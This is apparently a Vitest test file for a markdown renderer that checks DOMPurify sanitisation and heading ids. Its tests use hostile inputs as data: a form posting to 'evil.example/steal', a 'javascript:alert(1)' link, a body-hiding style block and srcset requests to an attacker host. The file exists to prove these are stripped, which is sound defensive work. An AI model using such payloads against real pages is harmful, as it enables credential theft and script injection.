// @vitest-environment jsdom
import DOMPurify from 'dompurify'
import { describe, expect, it } from 'vitest'
import { outline, renderMarkdown } from './markdown'

function dom(html: string): HTMLElement {
  const el = document.createElement('div')
  el.innerHTML = html
  return el
}

describe('renderMarkdown', () => {
  it('renders ordinary markdown', () => {
    const el = dom(renderMarkdown('# Titill\n\n**feitt** og `kóði`\n\n- a\n- b'))
    expect(el.querySelector('h1')?.textContent).toBe('Titill')
    expect(el.querySelector('strong')?.textContent).toBe('feitt')
    expect(el.querySelectorAll('li')).toHaveLength(2)
  })

  it('strips style elements and inline styles', () => {
    const el = dom(renderMarkdown('<style>body{display:none}</style>\n\n<p style="position:fixed">x</p>'))
    expect(el.querySelector('style')).toBeNull()
    expect(el.querySelector('[style]')).toBeNull()
    expect(el.textContent).not.toContain('display:none')
  })

  it('strips forms and form controls', () => {
    const el = dom(
      renderMarkdown(
        '<form action="https://evil.example/steal"><input name="p"><textarea></textarea><select><option>a</option></select><button formaction="https://evil.example">Senda</button></form>',
      ),
    )
    expect(el.querySelector('form, input, textarea, select, option, button')).toBeNull()
    expect(el.querySelector('[action], [formaction]')).toBeNull()
  })

  it('removes javascript links and opens other links in a new tab', () => {
    const el = dom(renderMarkdown('[a](javascript:alert(1)) [b](https://huginn.pro)'))
    const links = [...el.querySelectorAll('a')]
    expect(links.some((a) => (a.getAttribute('href') ?? '').startsWith('javascript'))).toBe(false)
    const ok = links.find((a) => a.getAttribute('href') === 'https://huginn.pro')
    expect(ok?.getAttribute('target')).toBe('_blank')
    expect(ok?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('keeps https images only', () => {
    const el = dom(
      renderMarkdown('![a](https://x.example/a.png) ![b](http://x.example/b.png) <img src="data:image/png;base64,AAAA"> <img src="/c.png">'),
    )
    const srcs = [...el.querySelectorAll('img')].map((i) => i.getAttribute('src'))
    expect(srcs).toEqual(['https://x.example/a.png'])
  })

  it('strips srcset, so an image cannot load over anything but its https src', () => {
    const el = dom(
      renderMarkdown(
        '<img src="https://x.example/a.png" srcset="http://evil.example/b.png 2x"> <picture><source srcset="http://evil.example/c.png"><img src="https://x.example/d.png"></picture>',
      ),
    )
    expect(el.querySelector('[srcset]')).toBeNull()
    const srcs = [...el.querySelectorAll('img')].map((i) => i.getAttribute('src'))
    expect(srcs).toEqual(['https://x.example/a.png', 'https://x.example/d.png'])
  })

  it('leaves the shared DOMPurify instance untouched', () => {
    renderMarkdown('[b](https://huginn.pro)')
    const out = DOMPurify.sanitize('<a href="https://huginn.pro">b</a><p style="color:red">x</p>')
    expect(out).toContain('style=')
    expect(out).not.toContain('target=')
  })
})

describe('heading ids and outline', () => {
  const doc = '# Markmið\n\ntexti\n\n## Rásir\n\n### **Instagram** og `TikTok`\n\n#### Sleppt\n\n## Næstu skref'

  it('gives h1 to h3 ids in order only when asked', () => {
    const html = renderMarkdown(doc, { headingIds: true })
    expect(html).toContain('<h1 id="hg-h-1">Markmið</h1>')
    expect(html).toContain('<h2 id="hg-h-2">Rásir</h2>')
    expect(html).toContain('id="hg-h-3"')
    expect(html).toContain('id="hg-h-4"')
    expect(html).not.toMatch(/<h4 id=/)
    expect(renderMarkdown(doc)).not.toContain('id="hg-h-')
  })

  it('outline matches the ids and strips inline marks', () => {
    expect(outline(doc)).toEqual([
      { id: 'hg-h-1', level: 1, text: 'Markmið' },
      { id: 'hg-h-2', level: 2, text: 'Rásir' },
      { id: 'hg-h-3', level: 3, text: 'Instagram og TikTok' },
      { id: 'hg-h-4', level: 2, text: 'Næstu skref' },
    ])
  })

  it('outline is empty without headings or with only h4 and deeper', () => {
    expect(outline('bara texti\n\n- listi')).toEqual([])
    expect(outline('#### fjórða\n\n##### fimmta')).toEqual([])
  })

  it('renders the same html as without ids apart from the ids', () => {
    const src = `${doc}\n\nlína eitt\nlína tvö\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n[b](https://huginn.pro)`
    const withIds = renderMarkdown(src, { headingIds: true }).replace(/ id="hg-h-\d+"/g, '')
    expect(withIds).toBe(renderMarkdown(src))
  })

  it('gives nested headings no id, so the outline and the ids agree', () => {
    const src = '# Fyrst\n\n> ## Í tilvitnun\n\n## Annað'
    const html = renderMarkdown(src, { headingIds: true })
    expect(html).toContain('<h2>Í tilvitnun</h2>')
    expect(html).toContain('<h2 id="hg-h-2">Annað</h2>')
    expect(outline(src).map((h) => h.id)).toEqual(['hg-h-1', 'hg-h-2'])
  })

  it('two calls start the counter again', () => {
    expect(renderMarkdown('# A', { headingIds: true })).toContain('hg-h-1')
    expect(renderMarkdown('# B', { headingIds: true })).toContain('hg-h-1')
  })
})
